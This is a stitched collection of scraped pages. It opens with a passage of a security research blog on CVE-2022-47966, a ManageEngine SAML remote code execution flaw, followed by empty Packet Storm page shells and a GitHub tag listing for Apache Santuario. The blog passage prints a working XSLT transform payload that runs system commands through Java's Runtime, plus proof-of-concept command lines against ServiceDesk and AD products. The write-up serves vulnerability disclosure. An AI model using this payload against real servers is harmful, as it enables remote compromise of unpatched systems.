In v1.4.1, reference validation happened near the top of the code block with the call to `si.verify()`. In v1.4.2, the call to `si.verify()` was moved to the end of the function after the signature verification in `sa.verify(sigBytes).`

### Vulnerability Ingredient 2: XSLT Injection

Furthermore, each `<Reference>` element can contain a `<Transform>` element responsible for describing how to modify an element before calculating its digest. Transforms allow for arbitrarily complex operations through the use of [XSL Transformations](https://www.w3.org/TR/xslt-30/) (XSLT).

These transforms are executed in `src/org/apache/xml/security/signature/Reference.java` which is eventually called from `si.verify()`from above.

[![Reference transforms](https://www.horizon3.ai/wp-content/uploads/2023/01/Screenshot-2023-01-17-at-3.04.23-PM.png)](https://www.horizon3.ai/wp-content/uploads/2023/01/Screenshot-2023-01-17-at-3.04.23-PM.png)

Reference transforms

XSLT is a turing-complete language and, in the ManageEngine environment, it is capable of executing arbitrary Java code. We can supply the following snippet to execute an arbitrary system command:

```
<ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">
    <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
        <xsl:template match="/">
            <xsl:variable name="rtobject" select="rt:getRuntime()"/>
            <xsl:variable name="process" select="rt:exec($rtobject,'{command}')"/>
            <xsl:variable name="processString" select="ob:toString($process)"/>
            <xsl:value-of select="$processString"/>
        </xsl:template>
    </xsl:stylesheet>
</ds:Transform>
```

Abusing the order of SAML validation in Apache Santuario v1.4.1 and Java’s XSLT library providing access to run arbitrary Java classes, we can exploit this vulnerability in ManageEngine products to gain remote code execution.

## SAML SSO Configuration

[Security Assertion Markup Language (SAML)](https://en.wikipedia.org/wiki/Security_Assertion_Markup_Language) is a specification for sharing authentication and authorization information between an application or service provider and an identity provider. SAML with single sign on allows users to not have to worry about maintaining credentials for all of the apps they use and it gives IT administrators a centralized location for user management.

SAML uses XML signature verification to ensure the secure transfer of messages passed between service providers and identity providers.

We can enable SAML SSO by navigating to `Admin -> Users & Permissions -> SAML Single Sign On` where we can enter our identity provider information. Once properly configured, we will see “Log in with SAML Single Sign On” on the logon page:

[![Service Desk SAML logon](https://www.horizon3.ai/wp-content/uploads/2023/01/Screenshot-2023-01-17-at-10.58.55-AM.png)](https://www.horizon3.ai/wp-content/uploads/2023/01/Screenshot-2023-01-17-at-10.58.55-AM.png)

Service Desk SAML logon

## Proof of Concept

Our proof of concept can be found [here](https://github.com/horizon3ai/CVE-2022-47966).

After configuring SAML, the Assertion Consumer URL will now be active at `https://<hostname>:8080/SamlResponseServlet` and we can send our malicious SAML Response.

```
python3 CVE-2022-47966.py --url https://10.0.40.64:8080/SamlResponseServlet --command notepad.exe
```

Since ServiceDesk runs as a service, there is no desktop to display the GUI for `notepad.exe` so we use ProcessExplorer to check the success of the exploit.

[![Notepad running](https://www.horizon3.ai/wp-content/uploads/2023/01/Screenshot-2023-01-17-at-11.41.48-AM.png)](https://www.horizon3.ai/wp-content/uploads/2023/01/Screenshot-2023-01-17-at-11.41.48-AM.png)

Notepad running

This proof of concept was also tested against Endpoint Central and we expect this POC to work unmodified on many of the ManageEngine products that share some of their codebase with ServiceDesk Plus or EndpointCentral.

Notably, the AD-related products (AdManager, etc) have additional checks on the SAML responses that must pass. They perform checks to verify that the SAML response looks like it came from the expected identity provider. Our POC has an optional `--issuer` argument to provide information to use for the `<Issuer>` element. Additionally, AD-related products have a different SAML logon endpoint URL that contains a guid. How to determine this information in an automated fashion is left as an exercise for the reader.

```
python3 CVE-2022-47966.py --url https://10.0.40.90:8443/samlLogin/<guid> --issuer https://sts.windows.net/<guid>/ --command notepad.exe
```
# Summary

In summary, when Apache Santuario is <= v1.4.1, the vulnerability is trivially exploitable and made possible via several conditions:

* Reference validation is performed before signature validation, allowing for the execution of malicious XSLT transforms.
* Execution of XSLT transforms allows an attacker to execute arbitrary Java code.

This vulnerability is still exploitable even when Apache Santuario is between v1.4.1 and v2.2.3, which some of the affected ManageEngine products were using at the time, such as Password Manager Pro. The original research, Khoadha, documents further bypasses of validation in their [research](https://blog.viettelcybersecurity.com/saml-show-stopper/) and is definitely worth a read.

##### How can NodeZero help you?

Let our experts walk you through a demonstration of NodeZero, so you can see how to put it to work for your company.[Get a Demo](https://www.horizon3.ai/contact-us/schedule-demo/)Share:

[![Renmoe Library](https://www.horizon3.ai/wp-content/uploads/2021/06/h3-white-logo.png)](https://www.horizon3.ai)Contact Us

### Subscribe to Community Updates

###### NodeZero Solution

* [NodeZero Overview](https://www.horizon3.ai/nodezero/)
* [Internal Pentesting](https://www.horizon3.ai/nodezero/continuous-internal-pentesting/)
* [Kubernetes Pentesting](https://www.horizon3.ai/nodezero/kubernetes-pentesting/)
* [External Pentesting](https://www.horizon3.ai/nodezero/external-pentesting/)
* [Cloud Pentesting](https://www.horizon3.ai/nodezero/cloud-pentesting/)
* [NodeZero Insights](https://www.horizon3.ai/nodezero/insights/)
* [Rapid Response](https://www.horizon3.ai/nodezero/rapid-response/)
* [AD Password Audit](https://www.horizon3.ai/nodezero/nodezero-ad-password-audit/)
* [Phishing Impact Testing](https://www.horizon3.ai/nodezero/phishing-impact-testing/)
* [NodeZero Tripwires](https://www.horizon3.ai/nodezero/nodezero-tripwires/)
* [NodeZero Documentation](https://docs.horizon3.ai/getting_started/)
* [Pentesting for Compliance](https://www.horizon3.ai/compliance/)
* [Pentesting for PCI Compliance](https://www.horizon3.ai/compliance/pci-pentesting/)
* [Pentesting for NIS 2 Compliance](https://www.horizon3.ai/compliance/nis-2-compliance/)
###### Resources

* [Blog](https://www.horizon3.ai/category/intelligence/blogs/)
* [Attack Research](https://www.horizon3.ai/category/attack-research/)
* [White Papers](https://www.horizon3.ai/category/downloads/whitepapers/)
* [Fact Sheets](https://www.horizon3.ai/category/downloads/factsheets/)
* [Case Studies](https://www.horizon3.ai/category/customer-story/)
* [Glossary](https://www.horizon3.ai/resource-center/glossary/)
###### Use Cases

* [Education](https://www.horizon3.ai/use-case/nodezero-in-education/)
* [Healthcare](https://www.horizon3.ai/use-case/for-healthcare/)
* [Manufacturing](https://www.horizon3.ai/use-case/nodezero-in-manufacturing/)
* [Public Sector](https://www.horizon3.ai/use-case/nodezero-in-the-public-sector/)
* [Supply Chain](https://www.horizon3.ai/use-case/nodezero-for-supply-chain/)
* [Large Organization](/who-uses-nodezero/#large-org/)
* [MSSPs and MSPs](https://www.horizon3.ai/partners/mssp-msp/)
* [DIB Suppliers](https://www.horizon3.ai/nsa-capt-program-for-dib-suppliers/)
* [On AWS Marketplace](https://www.horizon3.ai/horizon3-ai-and-aws/)
###### Roles

* [ITOps and SecOps](/who-uses-nodezero/#itops)
* [Security Teams](/who-uses-nodezero/#security-teams)
* [Consulting Pentester](/who-uses-nodezero/#pentesters)
###### Partners

* MSSPs and MSPs
* [Become a Partner](https://www.horizon3.ai/partners/)
* [Partner Portal](https://partners.horizon3.ai/)
###### Company

* [About Us](https://www.horizon3.ai/about-us/)
* [Careers](https://www.horizon3.ai/join-our-team/)
* [Press](https://www.horizon3.ai/category/news/press-release/)
* [Awards](https://www.horizon3.ai/category/news/awards/)
* [Contact](https://www.horizon3.ai/contact-us/)
* [Upcoming Events](https://www.horizon3.ai/events/)
© 2024 All Rights Reserved.
[Privacy Policy](https://www.horizon3.ai/privacy-policy/)[Support Policy](https://www.horizon3.ai/support-policy/)[Terms of Service](https://www.horizon3.ai/terms-of-service/)[Trust Center](https://trust.horizon3.ai/)



=== Content from packetstormsecurity.com_0c952dd6_20250111_143242.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from packetstormsecurity.com_010e27ca_20250111_143242.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from github.com_d619fd98_20250111_143248.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fapache%2Fsantuario-xml-security-java%2Ftags%3Fafter%3D1.4.6)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fapache%2Fsantuario-xml-security-java%2Ftags%3Fafter%3D1.4.6)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Freleases%2Ftag_history&source=header-repo&source_repo=apache%2Fsantuario-xml-security-java)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[apache](/apache)
/
**[santuario-xml-security-java](/apache/santuario-xml-security-java)**
Public

* [Notifications](/login?return_to=%2Fapache%2Fsantuario-xml-security-java) You must be signed in to change notification settings
* [Fork
  59](/login?return_to=%2Fapache%2Fsantuario-xml-security-java)
* [Star
   38](/login?return_to=%2Fapache%2Fsantuario-xml-security-java)

* [Code](/apache/santuario-xml-security-java)
* [Pull requests
  3](/apache/santuario-xml-security-java/pulls)
* [Actions](/apache/santuario-xml-security-java/actions)
* [Security](/apache/santuario-xml-security-java/security)
* [Insights](/apache/santuario-xml-security-java/pulse)

Additional navigation options

* [Code](/apache/santuario-xml-security-java)
* [Pull requests](/apache/santuario-xml-security-java/pulls)
* [Actions](/apache/santuario-xml-security-java/actions)
* [Security](/apache/santuario-xml-security-java/security)
* [Insights](/apache/santuario-xml-security-java/pulse)

# Tags: apache/santuario-xml-security-java

[Releases](/apache/santuario-xml-security-java/releases)
[Tags](/apache/santuario-xml-security-java/tags)

Tags

## [1.4.5](/apache/santuario-xml-security-java/releases/tag/1.4.5)

Toggle 1.4.5's commit message

```
Updating versions

```

* May 19, 2011
* [152af0e](/apache/santuario-xml-security-java/commit/152af0ead3f6cce9dcae3579ecfe4ea58f1c40db)
* [zip](/apache/santuario-xml-security-java/archive/refs/tags/1.4.5.zip)
* [tar.gz](/apache/santuario-xml-security-java/archive/refs/tags/1.4.5.tar.gz)

## [1.4.5-RC1](/apache/santuario-xml-security-java/releases/tag/1.4.5-RC1)

Toggle 1.4.5-RC1's commit message

```
Upgrading versions

```

* May 10, 2011
* [8e5883c](/apache/santuario-xml-security-java/commit/8e5883cfceffccec81a81612872c943f47457b28)
* [zip](/apache/santuario-xml-security-java/archive/refs/tags/1.4.5-RC1.zip)
* [tar.gz](/apache/santuario-xml-security-java/archive/refs/tags/1.4.5-RC1.tar.gz)

## [v1\_2\_1j](/apache/santuario-xml-security-java/releases/tag/v1_2_1j)

Toggle v1\_2\_1j's commit message

```
Move "v*" tags xml-security-java/tags.

```

* Dec 15, 2010
* [0a42178](/apache/santuario-xml-security-java/commit/0a42178796887b915707f55d41a52468464d40e6)
* [zip](/apache/santuario-xml-security-java/archive/refs/tags/v1_2_1j.zip)
* [tar.gz](/apache/santuario-xml-security-java/archive/refs/tags/v1_2_1j.tar.gz)

## [v1\_2j](/apache/santuario-xml-security-java/releases/tag/v1_2j)

Toggle v1\_2j's commit message

```
Move "v*" tags xml-security-java/tags.

```

* Dec 15, 2010
* [8c406d1](/apache/santuario-xml-security-java/commit/8c406d11666c01088b515ad8935517b223faffd6)
* [zip](/apache/santuario-xml-security-java/archive/refs/tags/v1_2j.zip)
* [tar.gz](/apache/santuario-xml-security-java/archive/refs/tags/v1_2j.tar.gz)

## [v1\_0\_85](/apache/santuario-xml-security-java/releases/tag/v1_0_85)

Toggle v1\_0\_85's commit message

```
Move "v*" tags xml-security-java/tags.

```

* Dec 15, 2010
* [15cc8fc](/apache/santuario-xml-security-java/commit/15cc8fc32ded1b710c0fbb3a51db508c56c3fa9a)
* [zip](/apache/santuario-xml-security-java/archive/refs/tags/v1_0_85.zip)
* [tar.gz](/apache/santuario-xml-security-java/archive/refs/tags/v1_0_85.tar.gz)

## [v1\_0\_84](/apache/santuario-xml-security-java/releases/tag/v1_0_84)

Toggle v1\_0\_84's commit message

```
Move "v*" tags xml-security-java/tags.

```

* Dec 15, 2010
* [7cc65f8](/apache/santuario-xml-security-java/commit/7cc65f8b2e60edd52fd74281e2844708385717f4)
* [zip](/apache/santuario-xml-security-java/archive/refs/tags/v1_0_84.zip)
* [tar.gz](/apache/santuario-xml-security-java/archive/refs/tags/v1_0_84.tar.gz)

## [v1\_0\_83](/apache/santuario-xml-security-java/releases/tag/v1_0_83)

Toggle v1\_0\_83's commit message

```
Move "v*" tags xml-security-java/tags.

```

* Dec 15, 2010
* [42985c4](/apache/santuario-xml-security-java/commit/42985c40df259dbc898f94ae104e0cc0af1ede9d)
* [zip](/apache/santuario-xml-security-java/archive/refs/tags/v1_0_83.zip)
* [tar.gz](/apache/santuario-xml-security-java/archive/refs/tags/v1_0_83.tar.gz)

## [v1\_0\_82](/apache/santuario-xml-security-java/releases/tag/v1_0_82)

Toggle v1\_0\_82's commit message

```
Move "v*" tags xml-security-java/tags.

```

* Dec 15, 2010
* [f5c3e7c](/apache/santuario-xml-security-java/commit/f5c3e7c6b202246a77c89bd07753da2a78b0ac24)
* [zip](/apache/santuario-xml-security-java/archive/refs/tags/v1_0_82.zip)
* [tar.gz](/apache/santuario-xml-security-java/archive/refs/tags/v1_0_82.tar.gz)

## [v1\_0\_81](/apache/santuario-xml-security-java/releases/tag/v1_0_81)

Toggle v1\_0\_81's commit message

```
Move "v*" tags xml-security-java/tags.

```

* Dec 15, 2010
* [6784d08](/apache/santuario-xml-security-java/commit/6784d08e3976cff966df36695b51929942dadfca)
* [zip](/apache/santuario-xml-security-java/archive/refs/tags/v1_0_81.zip)
* [tar.gz](/apache/santuario-xml-security-java/archive/refs/tags/v1_0_81.tar.gz)

## [v1\_0\_71](/apache/santuario-xml-security-java/releases/tag/v1_0_71)

Toggle v1\_0\_71's commit message

```
Move "v*" tags xml-security-java/tags.

```

* Dec 15, 2010
* [6612298](/apache/santuario-xml-security-java/commit/661229815e8270e632a683b2f8b7b322f7f87e7f)
* [zip](/apache/santuario-xml-security-java/archive/refs/tags/v1_0_71.zip)
* [tar.gz](/apache/santuario-xml-security-java/archive/refs/tags/v1_0_71.tar.gz)

[Previous](/apache/santuario-xml-security-java/tags?after=1.5.5)[Next](/apache/santuario-xml-security-java/tags?after=v1_0_71)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


